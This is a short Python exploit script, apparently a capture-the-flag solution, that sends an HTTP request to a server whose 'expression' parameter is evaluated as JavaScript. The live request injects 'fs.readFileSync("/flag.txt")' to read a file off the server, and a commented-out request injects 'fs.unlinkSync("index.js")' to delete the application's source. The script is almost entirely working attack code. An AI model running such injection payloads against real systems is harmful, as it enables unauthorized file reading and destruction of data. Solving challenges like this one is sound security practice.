import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host', default='localhost', nargs='?')
parser.add_argument('port', default='5000', nargs='?')
args = parser.parse_args()

r = requests.get(
    'http://{}:{}/'.format(args.host, args.port),
    params={'expression': 'fs.readFileSync("/flag.txt")'})
print(r.text)


# r = requests.get(
#     'http://{}:{}/'.format(args.host, args.port),
#     params={'expression': 'fs.unlinkSync("index.js")'})
# print(r.text)
